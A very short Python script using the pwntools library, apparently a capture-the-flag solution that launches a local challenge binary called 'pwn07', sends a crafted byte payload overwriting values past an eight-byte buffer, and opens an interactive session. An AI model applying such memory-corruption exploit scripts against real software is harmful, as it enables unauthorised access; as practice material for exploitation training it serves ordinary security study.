from pwn import remote,process

io=process('./pwn07')

payload = b'AAAAAAAA\xa4\x00\x00\x00\x85\x00\x00\x00'

io.recv()
io.send(payload)

io.interactive()